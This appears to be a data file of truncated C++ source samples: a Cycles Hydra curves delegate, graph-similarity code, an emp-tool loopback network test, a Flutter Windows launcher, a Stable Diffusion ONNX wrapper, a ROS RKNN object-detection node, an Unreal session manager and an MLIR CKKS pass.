clears the geometry, so need to populate everything again\n    bits |= HdChangeTracker::DirtyPoints | HdChangeTracker::DirtyWidths |\n            HdChangeTracker::DirtyPrimvar;\n  }\n\n  return bits;\n}\n\nvoid HdCyclesCurves::Populate(HdSceneDelegate *sceneDelegate, HdDirtyBits dirtyBits, bool &rebuild)\n{\n  if (HdChangeTracker::IsTopologyDirty(dirtyBits, GetId())) {\n    PopulateTopology(sceneDelegate);\n  }\n\n  if (dirtyBits & HdChangeTracker::DirtyPoints) {\n    PopulatePoints(sceneDelegate);\n  }\n\n  if (dirtyBits & HdChangeTracker::DirtyWidths) {\n    PopulateWidths(sceneDelegate);\n  }\n\n  if (dirtyBits & HdChangeTracker::DirtyPrimvar) {\n    PopulatePrimvars(sceneDelegate);\n  }\n\n  rebuild = (_geom->curve_keys_is_modified()) || (_geom->curve_radius_is_modified());\n}\n\nvoid HdCyclesCurves::PopulatePoints(HdSceneDelegate *sceneDelegate)\n{\n  VtValue value;\n\n  for (const HdExtComputationPrimvarDescriptor &desc :\n       sceneDelegate->GetExtComputationPrimvarDescriptors(GetId(), HdInterpolationVertex))\n  {\n    if (desc.name == HdTokens->points) {\n      auto valueStore = HdExtComputationUtils::GetComputedPrimvarValues({desc}, sceneDelegate);\n      const auto valueStoreIt = valueStore.find(desc.name);\n      if (valueStoreIt != valueStore.end()) {\n        value = std::move(valueStoreIt->second);\n      }\n      break;\n    }\n  }\n\n  if (value.IsEmpty()) {\n    value = GetPrimvar(sceneDelegate, HdTokens->points);\n  }\n\n  if (!value.IsHolding<VtVec3fArray>()) {\n    TF_WARN(\"Invalid points data for %s\", GetId().GetText());\n    return;\n  }\n\n  const auto &points = value.UncheckedGet<VtVec3fArray>();\n\n  array<float3> pointsDataCycles;\n  pointsDataCycles.reserve(points.size());\n\n  for (const GfVec3f &point : points) {\n    pointsDataCycles.push_back_reserved(make_float3(point[0], point[1], point[2]));\n  }\n\n  _geom->set_curve_keys(pointsDataCycles);\n}\n\nvoid HdCyclesCurves::PopulateWidths(HdSceneDelegate *sceneDelegate)\n{\n  VtValue value = GetPrimvar(sceneDelegate, HdTokens->widths);\n  const HdInterpolation interpolation = GetPrimvarInterpolation(sceneDelegate, HdTokens->widths);\n\n  if (!value.IsHolding<VtFloatArray>()) {\n    TF_WARN(\"Invalid widths data for %s\", GetId().GetText());\n    return;\n  }\n\n  const auto &widths = value.UncheckedGet<VtFloatArray>();\n\n  array<float> radiusDataCycles;\n  radiusDataCycles.reserve(widths.size());\n\n  if (interpolation == HdInterpolationConstant) {\n    TF_VERIFY(widths.size() == 1);\n\n    const float constantRadius = widths[0] * 0.5f;\n\n    for (size_t i = 0; i < _geom->num_keys(); ++i) {\n      radiusDataCycles.push_back_reserved(constantRadius);\n    }\n  }\n  else if (interpolation == HdInterpolationVertex) {\n    TF_VERIFY(widths.size() == _geom->num_keys());\n\n    for (size_t i = 0; i < _geom->num_keys(); ++i) {\n      radiusDataCycles.push_back_reserved(widths[i] * 0.5f);\n    }\n  }\n\n  _geom->set_curve_radius(radiusDataCycles);\n}\n\nvoid HdCyclesCurves::PopulatePrimvars(HdSceneDelegate *sceneDelegate)\n{\n  Scene *const scene = (Scene *)_geom->get_owner();\n\n  const std::pair<HdInterpolation, AttributeElement> interpolations[] = {\n      std::make_pair(HdInterpolationVertex, ATTR_ELEMENT_CURVE_KEY),\n      std::make_pair(HdInterpolationVarying, ATTR_ELEMENT_CURVE_KEY),\n      std::make_pair(HdInterpolationUniform, ATTR_ELEMENT_CURVE),\n      std::make_pair(HdInterpolationConstant, ATTR_ELEMENT_OBJECT),\n  };\n\n  for (const auto &interpolation : interpolations) {\n    for (const HdPrimvarDescriptor &desc :\n         GetPrimvarDescriptors(sceneDelegate, interpolation.first))\n    {\n      // Skip special primvars that are handled separately\n      if (desc.name == HdTokens->points || desc.name == HdTokens->widths) {\n        continue;\n      }\n\n      VtValue value = GetPrimvar(sceneDelegate, desc.name);\n      if (value.IsEmpty()) {\n        continue;\n      }\n\n      const ustring name(desc.name.GetString());\n\n      AttributeSta",
    "#ifndef DEBUG\n#include <pybind11/pybind11.h>\n#endif\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <cstdlib>\n#include <map>\n#include <set>\n#include <array>\n#include <iomanip>\n#include <chrono>\n#include \"json.hpp\"\n#ifndef DEBUG\n#include <pybind11/stl.h>\n\nnamespace py = pybind11;\n#endif\n\nusing json = nlohmann::json;\n\n\ntypedef std::vector<double> ArrayDouble;\ntypedef std::vector<int> ArrayInt;\ntypedef std::vector<bool> ArrayBool;\ntypedef std::pair<int, int> Pii;\n\ntypedef std::vector<ArrayInt> AdjList;\ntypedef std::vector<ArrayDouble> GraphEdgesMap;\n\ntypedef std::set<int> GraphNodesSet;\ntypedef std::set<Pii> GraphEdgesSet;\n\ntypedef std::vector<ArrayDouble> Matrix;\n\n\nstruct Edge{\n    std::string source;\n    std::string target;\n    bool is_directed;\n    double value;\n};\n\n\nstruct SubGraph{\n    int time;\n    bool node_present;\n    ArrayInt nodes;\n    std::vector<Pii> links;\n};\n\n\nstruct SubgraphSet {\n    int from, to;\n    GraphNodesSet nodes;\n    GraphEdgesSet links;\n};\n\n\nstruct SubgraphVector {\n    int from, to;\n    std::vector<std::string> nodes;\n    std::vector<Edge> links;\n};\n\n\nclass GraphSimilarity {\nprivate:\n    int totalNodeCount;\n    int firstTime, lastTime;\n    bool is_directed_graph;\n    std::map<std::string, int> mapNodeToInt;\n    std::vector<std::string> mapIntToNode;\n    std::vector<GraphEdgesMap> graphMaps;\n    std::vector<GraphEdgesSet> graphSets;\n    std::vector<AdjList> adjNodes;\n    std::vector<ArrayBool> checkNode;\n\n    GraphEdgesSet intersection(GraphEdgesSet &set1, GraphEdgesSet &set2) {\n        GraphEdgesSet intersect;\n        std::set_intersection(set1.begin(), set1.end(), set2.begin(), set2.end(), \n                            std::inserter(intersect, intersect.begin()));\n        return intersect;\n    }\n    double weighted_intersection(GraphEdgesMap &graphMap1, GraphEdgesMap &graphMap2, \n                             GraphEdgesSet &set1, GraphEdgesSet &set2, \n                             GraphEdgesSet& intersect) {\n        double total_len = 0;\n        for(auto it: intersect) {\n            double e1 = graphMap1[it.first][it.second];\n            double e2 = graphMap2[it.first][it.second];\n            if(std::max(e1, e2) == 0) continue;\n            total_len += std::min(e1, e2) / std::max(e1, e2);\n        }\n        return total_len;\n    }\n\n    void load_data(const json &data) {\n        totalNodeCount = 0;\n        for(auto graph: data) {\n            for(auto node: graph[\"nodes\"]) {\n                std::string id = node[\"id\"];\n                if(mapNodeToInt.find(id) == mapNodeToInt.end()) {\n                    mapIntToNode.push_back(id);\n                    mapNodeToInt[id] = totalNodeCount++;\n                }\n            }\n        }\n        for(auto graph: data) {\n            graphMaps.push_back(GraphEdgesMap(totalNodeCount));\n            adjNodes.push_back(AdjList(totalNodeCount));\n            checkNode.push_back(ArrayBool(totalNodeCount));\n\n            for(auto &graphMap: graphMaps.back()) graphMap.reserve(totalNodeCount);\n            graphSets.push_back(GraphEdgesSet());\n\n            for(auto link: graph[\"links\"]) {\n                int u = mapNodeToInt[link[\"source\"]];\n                int v = mapNodeToInt[link[\"target\"]];\n\n                adjNodes.back()[u].push_back(v);\n\n                checkNode.back()[u] = true;\n                checkNode.back()[v] = false;\n\n                graphMaps.back()[u][v] = double(link[\"value\"]);\n                graphSets.back().insert({ u, v });\n            }\n        }\n    }\n\n    SubGraph get_ego_subgraph(const int &id, const int &time) {\n        bool node_present = checkNode[time][id];\n\n        std::set<int> new_nodes;\n        std::vector<Pii> new_links;\n\n        for(auto link: graphSets[time]) {\n            int u = link.first;\n            int v = link.second;\n\n            if(u == id) {\n                new_links.push_back(link);\n                new_nodes.insert(v);\n            } else if(v == id) {\n                new_links.push_back(link);\n                new_nodes.insert(u);\n            }\n        }\n\n        new_nodes.insert(id);\n        return {\n            time,\n            node_present,\n            ArrayInt(new_nodes.begin(), new_nodes.end()),\n            new_links\n        };\n    }\n\n    SubGraph get_neighbor_subgraph(const int &id, const int &time) {\n        SubGraph network = get_ego_subgraph(id, time);\n        std::set<int> new_nodes(network.nodes.begin(), network.nodes.end());\n\n        new_nodes.erase(id);\n        for(auto link: graphSets[time]) {\n            int u = link.first;\n            int v = link.second;\n\n            if(new_nodes.find(u) != new_nodes.end() && new_nodes.find(v) != new_nodes.end()) {\n                network.links.push_back(link);\n            }\n        }\n\n        new_nodes.insert(id);\n        network.nodes = ArrayInt(new_nodes.begin(), new_nodes.end());\n\n        return network;        \n    }\n\npublic:\n    GraphSimilarity(): totalNodeCount(0), is_directed_graph(false) {}\n\n    GraphS",
    "#include \"emp-tool/emp-tool.h\"\n#include <iostream>\nusing namespace std;\nusing namespace emp;\n\nint port, party;\ntemplate<typename T>\nvoid test(T * io) {\n\tif(party == ALICE) {\n\t\tfor (long long length = 2; length <= 8192*16; length*=2) {\n\t\t\tlong long times = 1024*1024*128/length;\n\t\t\tblock * data = new block[length];\n\t\t\tauto start = clock_start();\n\t\t\tfor (int i = 0; i < times; ++i) {\n\t\t\t\tio->send_block(data, length);\n\t\t\t}\n\t\t\tdouble interval = time_from(start);\n\t\t\tdelete[] data;\n\t\t\tcout << \"Loopback speed with block size \"<<length<<\" :\\t\"<<(length*times*128)/(interval+0.0)*1e6*1e-9<<\" Gbps\\n\";\n\t\t}\n\t} else {//party == BOB\n\t\tfor (long long length = 2; length <= 8192*16; length*=2) {\n\t\t\tlong long times = 1024*1024*128/length;\n\t\t\tblock * data = new block[length];\n\t\t\tfor (int i = 0; i < times; ++i) {\n\t\t\t\tio->recv_block(data, length);\n\t\t\t}\n\t\t\tdelete[] data;\n\t\t}\n\t}\n\tPRG prg(&zero_block);\n\tbool * data = new bool[1024*1024];\n\tbool * data2 = new bool[1024*1024];\n\tprg.random_bool(data, 1024*1024);\n\tif(party == ALICE) {\n\t\tio->send_bool(data, 1024*1024);\n\t\tio->send_bool(data+7, 1024*1024-7);\n\t} else {\n\t\tio->recv_bool(data2, 1024*1024);\n\t\tassert(memcmp(data2, data, 1024*1024) == 0);\n\t\tmemset(data2, 0, 1024*1024);\n\t\tio->recv_bool(data2+7, 1024*1024-7);\n\t\tassert(memcmp(data2+7, data+7, 1024*1024-7) == 0);\n\t}\n\tdelete[] data;\n\tdelete[] data2;\n}\nint main(int argc, char** argv) {\n\tparse_party_and_port(argv, &party, &port);\n\n\tcout <<\"NetIO\\n\";\n\tNetIO * io = new NetIO(party == ALICE ? nullptr:\"127.0.0.1\", port);\n\ttest<NetIO>(io);\n\tdelete io;\n\n\tcout <<\"HighSpeed NetIO\\n\";\n\tHighSpeedNetIO * hsio = new HighSpeedNetIO(party == ALICE ? nullptr:\"127.0.0.1\", port, port+1);\n\ttest<HighSpeedNetIO>(hsio);\n\tdelete hsio;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quizzleer\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"stablediffusionmodel.h\"\n#include \"Collections/Hasher.h\"\n#include \"Infrastructure/BitwiseOperations.h\"\n#include \"Infrastructure/DependencyContainer.h\"\n\nusing namespace Axodox::Graphics;\nusing namespace Axodox::MachineLearning;\nusing namespace Axodox::Collections;\n#include \"nlohmann/json.hpp\"\n#include <fstream>\nusing json = nlohmann::json;\nusing namespace std;\n\n\n\nvoid StableDiffusionModel::GetPredictionType(const std::string& ModelPath)\n{\n    std::string SchedulerConfPath = \"scheduler/scheduler_config.json\";\n\n\n    if (!(ModelPath[ModelPath.size() - 1] == '/' || ModelPath[ModelPath.size() - 1] == '\\\\'))\n        SchedulerConfPath = \"/\" + SchedulerConfPath;\n\n    // read a JSON file\n    std::ifstream i(ModelPath + SchedulerConfPath);\n\n    json SchedulerConf;\n\n    i >> SchedulerConf;\n\n    i.close();\n\n    std::string PredTypeString = SchedulerConf[\"prediction_type\"].get<std::string>();\n\n    if (PredTypeString == \"v_prediction\")\n        PredictionType = StableDiffusionSchedulerPredictionType ::V;\n    else\n        PredictionType = StableDiffusionSchedulerPredictionType::Epsilon;\n\n}\n\nvoid StableDiffusionModel::CreateTextEmbeddings(const std::string& PosPrompt, const std::string& NegPrompt, Axodox::MachineLearning::StableDiffusionOptions& Options, ScheduledTensor* SchTensor)\n{\n\n\n\n    auto encodedNegativePrompt = TxtEmbedder->SchedulePrompt(NegPrompt, Options.StepCount);\n    auto encodedPositivePrompt = TxtEmbedder->SchedulePrompt(PosPrompt, Options.StepCount);\n\n    Options.TextEmbeddings.Weights.reserve(encodedNegativePrompt[0].Weights.size() + encodedPositivePrompt[0].Weights.size());\n    for (auto weight : encodedNegativePrompt[0].Weights) Options.TextEmbeddings.Weights.push_back(-weight);\n    for (auto weight : encodedPositivePrompt[0].Weights) Options.TextEmbeddings.Weights.push_back(weight);\n\n    ScheduledTensor tensor = *SchTensor;\n    trivial_map<pair<void*, void*>, shared_ptr<EncodedText>> embeddingBuffer;\n    for (auto i = 0u; i < Options.StepCount; i++)\n    {\n        auto& concatenatedTensor = embeddingBuffer[{ encodedNegativePrompt[i].Tensor.get(), encodedPositivePrompt[i].Tensor.get() }];\n        if (!concatenatedTensor)\n        {\n            concatenatedTensor = make_shared<EncodedText>(encodedNegativePrompt[i].Tensor->Concat(*encodedPositivePrompt[i].Tensor));\n        }\n\n        tensor[i] = concatenatedTensor;\n    }\n\n    Options.TextEmbeddings.Tensor = tensor;\n\n}\n\nvoid StableDiffusionModel::LoadVAEEncoder()\n{\n    VAE_E = std::make_unique<VaeEncoder>(*Env);\n\n}\n\nStableDiffusionModel::StableDiffusionModel() {\n    Loaded = false;\n    /*\n        debugController = nullptr;\n        if (SUCCEEDED(D3D12GetDebugInterface(IID_PPV_ARGS(&debugController)))) {\n            debugController->EnableDebugLayer();\n        }\n        if (debugController) debugController->Release();\n    */\n}\n\nvoid StableDiffusionModel::Destroy()\n{\n    try\n    {\n        Env.reset();\n        TxtEmbedder.reset();\n        UNet.reset();\n        VAE_D.reset();\n        VAE_E.reset();\n\n    }\n    catch (...)\n    { // nobody gives a shit about errors on deletion.\n\n    }\n\n}\n\nbool StableDiffusionModel::Load(const std::string& ModelPath)\n{\n    if (Loaded)\n        Destroy();\n\n    if (Env)\n        Env.reset();\n\n    Env = std::make_unique<OnnxEnvironment>(ModelPath);\n\n    TxtEmbedder = std::make_unique<TextEmbedder>(*Env);\n    UNet = std::make_unique<StableDiffusionInferer>(*Env);\n    VAE_D = std::make_unique<VaeDecoder>(*Env);\n\n    GetPredictionType(ModelPath);\n    Loaded = true;\n\n    return true;\n}\n\nTensor StableDiffusionModel::EncodeImageVAE(const Axodox::Graphics::TextureData& TexData)\n{\n\n    if (!VAE_E)\n        LoadVAEEncoder();\n\n\n    Tensor InpTexTens = Tensor::FromTextureData(TexData.ToFormat(DXGI_FORMAT_B8G8R8A8_UNORM_SRGB), ColorNormalization::LinearPlusMinusOne);\n    return VAE_E->EncodeVae(InpTexTens);\n\n}\n\nstd::vector<Axodox::Collections::aligned_vector<uint8_t>> StableDiffusionModel::DoTxt2Img(const std::string& Prompt, const std::string& NegativePrompt, Axodox::MachineLearning::StableDiffusionOptions Options, Axodox::Threading::async_operation_source* OpSrc)\n{\n    // Make embeddings\n    Options.PredictionType = PredictionType;\n\n    ScheduledTensor ScheduledEmbedTens{ Options.StepCount };\n    std::vector<aligned_vector<uint8_t>> ImageBuffers;\n\n    CreateTextEmbeddings(Prompt, NegativePrompt, Options, &ScheduledEmbedTens);\n\n    // Inference UNet\n\n    auto x = UNet->RunInference(Options, OpSrc);\n\n    if (OpSrc->is_cancelled())\n        return std::vector<aligned_vector<uint8_t>>{};\n\n    // VAE\n\n    x = VAE_D->DecodeVae(x);\n\n    TextureData d;\n\n    auto ImageTextures = x.ToTextureData(ColorNormalization::LinearPlusMinusOne);\n\n    for (auto& ImgTexture : ImageTextures) {\n        auto ImageBuffer = ImgTexture.ToFormat(DXGI_FORMAT_R8G8B8A8_UNORM_SRGB).Buffer; // ToBuffer() emits obscure D3D12 error because it's been shitting itself\n        ImageBuffers.push_back(ImageBuffer);\n    }\n\n\n\n    return ImageBuffers;\n\n}\n\nvoid StableDiffusionModel::Relea",
    "/*\n * Author: alm\n * Email: almtach@outlook.com\n */\n\n#include <ros/ros.h>\n#include <ros/package.h>\n#include \"object_information_msgs/Object.h\"\n#include <image_transport/image_transport.h>\n#include <sensor_msgs/Image.h>\n#include <cv_bridge/cv_bridge.h>\n#include <opencv2/opencv.hpp>\n#include <opencv2/highgui/highgui.hpp>\n#include \"postprocess.h\"\n#include \"rk_common.h\"\n#include \"rknn_api.h\"\n#include \"config.h\" \n// COCO \u6570\u636e\u96c6\u6807\u7b7e\nstatic const char *labels[] = {\n    \"person\", \"bicycle\", \"car\", \"motorcycle\", \"airplane\", \"bus\", \"train\", \"truck\", \"boat\", \"traffic light\",\n    \"fire hydrant\", \"stop sign\", \"parking meter\", \"bench\", \"bird\", \"cat\", \"dog\", \"horse\", \"sheep\", \"cow\",\n    \"elephant\", \"bear\", \"zebra\", \"giraffe\", \"backpack\", \"umbrella\", \"handbag\", \"tie\", \"suitcase\", \"frisbee\",\n    \"skis\", \"snowboard\", \"sports ball\", \"kite\", \"baseball bat\", \"baseball glove\", \"skateboard\", \"surfboard\",\n    \"tennis racket\", \"bottle\", \"wine glass\", \"cup\", \"fork\", \"knife\", \"spoon\", \"bowl\", \"banana\", \"apple\",\n    \"sandwich\", \"orange\", \"broccoli\", \"carrot\", \"hot dog\", \"pizza\", \"donut\", \"cake\", \"chair\", \"couch\",\n    \"potted plant\", \"bed\", \"dining table\", \"toilet\", \"tv\", \"laptop\", \"mouse\", \"remote\", \"keyboard\", \"cell phone\",\n    \"microwave\", \"oven\", \"toaster\", \"sink\", \"refrigerator\", \"book\", \"clock\", \"vase\", \"scissors\", \"teddy bear\",\n    \"hair drier\", \"toothbrush\"};\nstatic const unsigned char colors[19][3] = {\n    {54, 67, 244},\n    {99, 30, 233},\n    {176, 39, 156},\n    {183, 58, 103},\n    {181, 81, 63},\n    {243, 150, 33},\n    {244, 169, 3},\n    {212, 188, 0},\n    {136, 150, 0},\n    {80, 175, 76},\n    {74, 195, 139},\n    {57, 220, 205},\n    {59, 235, 255},\n    {7, 193, 255},\n    {0, 152, 255},\n    {34, 87, 255},\n    {72, 85, 121},\n    {158, 158, 158},\n    {139, 125, 96}};\n// RKNN \u5e94\u7528\u4e0a\u4e0b\u6587\nrknn_app_context_t rknn_app_ctx;\n\n// \u9608\u503c\u53d8\u91cf\nfloat box_conf_threshold;\nfloat nms_threshold;\nros::Time last_time;\nobject_information_msgs::Object objMsg;\nros::Publisher obj_pub;\nsensor_msgs::ImagePtr image_msg;\nimage_transport::Publisher image_pub;\n// detect_result_group_t detect_result_group;\nbool display_output = true;\nstd::string camera_topic;\nstd::string label_flag = \"none\";\n// \u56fe\u50cf\u8ba2\u9605\u56de\u8c03\u51fd\u6570\nvoid imageCallback(const sensor_msgs::ImageConstPtr &msg)\n{\n    // \u5c06 ROS \u56fe\u50cf\u6d88\u606f\u8f6c\u6362\u4e3a OpenCV \u56fe\u50cf\n    ros::Time current_time = ros::Time::now();\n    int color_index = 0;\n    cv_bridge::CvImagePtr cv_ptr;\n    float fps = 0.0;\n    \n    // last_time = current_time;\n    \n    try\n    {\n\n        cv_ptr = cv_bridge::toCvCopy(msg, sensor_msgs::image_encodings::BGR8);\n    }\n    catch (cv_bridge::Exception &e)\n    {\n        ROS_ERROR(\"cv_bridge exception: %s\", e.what());\n        return;\n    }\n\n    cv::Mat orig_img = cv_ptr->image;\n    cv::Mat img;\n    cv::Mat resized_img;\n\n    // \u8f6c\u6362 BGR -> RGB\n    cv::cvtColor(orig_img, img, cv::COLOR_BGR2RGB);\n    int img_width = img.cols;\n    int img_height = img.rows;\n\n    // \u68c0\u67e5\u5c3a\u5bf8\n    int width = rknn_app_ctx.model_width;\n    int height = rknn_app_ctx.model_height;\n    void *buf = nullptr;\n    if (img_width != width || img_height != height)\n    {\n        cv::resize(img, resized_img, cv::Size(width, height));\n        buf = (void *)resized_img.data;\n    }\n    else\n    {\n        buf = (void *)img.data;\n    }\n\n    // \u58f0\u660e\u68c0\u6d4b\u7ed3\u679c\u5217\u8868\n    object_detect_result_list od_results;\n\n    // \u8bbe\u7f6e\u8f93\u5165\u6570\u636e\n    rknn_input inputs[rknn_app_ctx.io_num.n_input];\n    inputs[0].index = 0;\n    inputs[0].type = RKNN_TENSOR_UINT8;\n    inputs[0].fmt = RKNN_TENSOR_NHWC;\n    inputs[0].size = rknn_app_ctx.model_width * rknn_app_ctx.model_height * rknn_app_ctx.model_channel;\n    inputs[0].buf = buf;\n\n    // \u8bbe\u7f6e\u8f93\u5165\n    int ret = rknn_inputs_set(rknn_app_ctx.rknn_ctx, rknn_app_ctx.io_num.n_input, inputs);\n    if (ret < 0)\n    {\n        ROS_ERROR(\"rknn_input_set fail! ret=%d\", ret);\n        return;\n    }\n\n    // \u5206\u914d\u8f93\u51fa\n    rknn_output outputs[rknn_app_ctx.io_num.n_output];\n    memset(outputs, 0, sizeof(outputs));\n    for (uint32_t i = 0; i < rknn_app_ctx.io_num.n_output; i++)\n    {\n        outputs[i].index = i;\n        outputs[i].want_float = (!rknn_app_ctx.is_quant);\n    }\n\n    // \u8fd0\u884c\u6a21\u578b\n    rknn_run(rknn_app_ctx.rknn_ctx, nullptr);\n    rknn_outputs_get(rknn_app_ctx.rknn_ctx, rknn_app_ctx.io_num.n_output, outputs, NULL);\n\n    // \u540e\u5904\u7406\n    float scale_w = (float)width / img_width;\n    float scale_h = (float)height / img_height;\n    post_process(&rknn_app_ctx, outputs, box_conf_threshold, nms_threshold, scale_w, scale_h, &od_results);\n\n    // \u7ed8\u5236\u5bf9\u8c61\n    char text[256];\n    for (int i = 0; i < od_results.count; i++)\n    {\n        const unsigned char *color = colors[color_index % 19];\n        color_index++;\n        cv::Scalar cc(color[0], color[1], color[2]);\n        object_detect_result *det_result = &(od_results.results[i]);\n\n        int x1 = det_result->box.left;\n        int y1 = det_result->box.top;\n        int x2 = det_result->box.right;\n        int y2 = det_result->box.bottom;\n        cv::rectangle(orig_img, cv::Point(x1, y1), cv::Point(x2, y2), cc);\n        objMsg.header.seq++;\n        objMsg.header.stamp ",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"VeilGameInstance.h\"\n#include \"VeilGameModeBase.h\"\n#include \"OnlineSubsystem.h\"\n#include \"OnlineSessionSettings.h\"\n#include \"Online/OnlineSessionNames.h\"\n#include <string>\n#include \"Kismet/GameplayStatics.h\"\n#include \"VeilGameState.h\"\n#include \"Net/UnrealNetwork.h\"\n\nvoid UVeilGameInstance::registerPlayer(AController* newPlayer) {\n    if (newPlayer) {\n        FPLAYER_DATA newPlayerData;\n        newPlayerData.team = (playerData.Num() + 1) % 2;\n        playerData.Add( newPlayer, newPlayerData );\n        UE_LOG(LogTemp, Log, TEXT(\"Registered player with team %d\"), newPlayerData.team);\n\n        /**\n        if (GEngine) {\n            GEngine->AddOnScreenDebugMessage(-1, 5.0f, FColor::Cyan, FString::Printf(TEXT(\"Registered player with team %d\"), newPlayerData.team));\n        }\n        **/\n\n    }\n    else {\n        UE_LOG(LogTemp, Warning, TEXT(\"Attempted to register a null player\"));\n    }\n\n    ((AVeilGameModeBase*)GetWorld()->GetAuthGameMode())->updateGameState();\n}\n\nint UVeilGameInstance::getPlayerTeam(AController* newPlayer) {\n\treturn playerData[newPlayer].team;\n}\n\nFPLAYER_DATA UVeilGameInstance::getPlayerData(AController* newPlayer) {\n\treturn playerData[newPlayer];\n}\n\nvoid UVeilGameInstance::setPlayerData(AController* player, FPLAYER_DATA newData)\n{\n    playerData[player] = newData;\n}\n\nbool UVeilGameInstance::updatePlayerTeam(AController* player, int newTeam)\n{\n    if (playerData[player].team != newTeam) {\n        playerData[player].team = newTeam;\n        return true;\n    }\n    else {\n        return false;\n    }\n}\n\nbool UVeilGameInstance::updatePlayerLife(AController* player, bool alive)\n{\n    if (playerData[player].alive != alive) {\n        playerData[player].alive = alive;\n        return true;\n    }\n    else {\n        return false;\n    }\n}\n\nbool UVeilGameInstance::updatePlayerLoadout(AController* player, FLoadout loadout)\n{\n    playerData[player].loadout = loadout;\n    return true;\n}\n\nTMap<AController*, FPLAYER_DATA> UVeilGameInstance::getAllPlayerData() {\n    return playerData;\n}\n\nvoid UVeilGameInstance::clearPlayerData()\n{\n    playerData.Empty();\n}\n\nvoid UVeilGameInstance::resetPlayerData()\n{\n    for (auto pd : playerData) {\n        updatePlayerLife(pd.Key, false);\n        FLoadout empty;\n        updatePlayerLoadout(pd.Key, empty);\n    }\n\n    AVeilGameState* gs = GetWorld()->GetGameState<AVeilGameState>();\n    gs->attackerAlive = 0;\n    gs->defenderAlive = 0;\n    gs->reinforcements = 10;\n}\n\nvoid UVeilGameInstance::Init() {\n    if (IOnlineSubsystem* subsystem = IOnlineSubsystem::Get()) {\n        sessionInterface = subsystem->GetSessionInterface();\n\n        if (sessionInterface.IsValid()) {\n            sessionInterface->OnCreateSessionCompleteDelegates.AddUObject(this, &UVeilGameInstance::OnCreateSessionComplete);\n            sessionInterface->OnFindSessionsCompleteDelegates.AddUObject(this, &UVeilGameInstance::OnFindSessionComplete);\n            sessionInterface->OnJoinSessionCompleteDelegates.AddUObject(this, &UVeilGameInstance::OnJoinSessionComplete);\n        }\n    }\n}\n\nvoid UVeilGameInstance::CreateServer(FName serverName) {\n    \n    FOnlineSessionSettings sessionSettings;\n    sessionSettings.bAllowJoinInProgress = true;\n    sessionSettings.bIsDedicated = false;\n    sessionSettings.bIsLANMatch = true;\n    sessionSettings.bShouldAdvertise = true;\n    sessionSettings.bUsesPresence = true;\n    sessionSettings.NumPublicConnections = 10;\n\n\n    sessionInterface->CreateSession(0, serverName, sessionSettings);\n\n    if (GEngine)\n        GEngine->AddOnScreenDebugMessage(-1, 15.0f, FColor::Yellow, TEXT(\"Creating Server with name: \" + serverName.ToString()));\n}\n\nvoid UVeilGameInstance::OnCreateSessionComplete(FName serverName, bool success) {\n    if (success) {\n        if (GEngine)\n            GEngine->AddOnScreenDebugMessage(-1, 15.0f, FColor::Yellow, TEXT(\"Created server with name: \" + serverName.ToString()));\n        clearPlayerData();\n        //GetWorld()->ServerTravel(\"/Game/Maps/Lobby?listen\");\n        UGameplayStatics::OpenLevel(GetWorld(), \"/Game/Maps/Lobby?listen\", true);\n    }else {\n        if (GEngine)\n            GEngine->AddOnScreenDebugMessage(-1, 15.0f, FColor::Yellow, TEXT(\"Could not create server with name: \" + serverName.ToString()));\n    }\n}\n\nvoid UVeilGameInstance::JoinServer(FName serverName) {\n    sessionSearch = MakeShareable(new FOnlineSessionSearch());\n    sessionSearch->bIsLanQuery = true;\n    sessionSearch->MaxSearchResults = 10000;\n    sessionSearch->QuerySettings.Set(SEARCH_PRESENCE, true, EOnlineComparisonOp::Equals);\n\n    serverToJoin = serverName;\n    sessionInterface->FindSessions(0, sessionSearch.ToSharedRef());\n}\n\nvoid UVeilGameInstance::OnFindSessionComplete(bool success){\n    if (success) {\n        TArray<FOnlineSessionSearchResult> searchResults = sessionSearch->SearchResults;\n        if (GEngine)\n            GEngine->AddOnScreenDebugMessage(-1, 15.0f, FColor::Yellow, TEXT(\"Server count: \" ",
    "\n\n#include <map>\n\n#include \"hecate/Dialect/CKKS/IR/CKKSOps.h\"\n#include \"hecate/Dialect/CKKS/IR/PolyTypeInterface.h\"\n#include \"hecate/Dialect/CKKS/Transforms/Passes.h\"\n#include \"mlir/Analysis/Liveness.h\"\n#include \"mlir/Dialect/Func/IR/FuncOps.h\"\n#include \"mlir/Transforms/GreedyPatternRewriteDriver.h\"\n\nnamespace hecate {\nnamespace ckks {\n#define GEN_PASS_DEF_REUSEBUFFER\n#include \"hecate/Dialect/CKKS/Transforms/Passes.h.inc\"\n} // namespace ckks\n} // namespace hecate\n\nusing namespace mlir;\n\nnamespace {\n/// Pass to bufferize Arith ops.\nstruct ReuseBufferPass\n    : public hecate::ckks::impl::ReuseBufferBase<ReuseBufferPass> {\n  ReuseBufferPass() {}\n\n  void runOnOperation() override {\n    auto &&func = getOperation();\n    mlir::OpBuilder builder(func);\n    mlir::Liveness l(func);\n    SmallVector<Value, 4> garbage;\n    func.walk([&](mlir::DestinationStyleOpInterface op) {\n      for (int i = 0; i < op.getNumDpsInputs(); i++) {\n        auto v = op.getDpsInputOperand(i);\n        if (auto tt = hecate::ckks::getPolyType(v->get())) {\n          if (tt.getNumPoly() == 1)\n            continue;\n          if 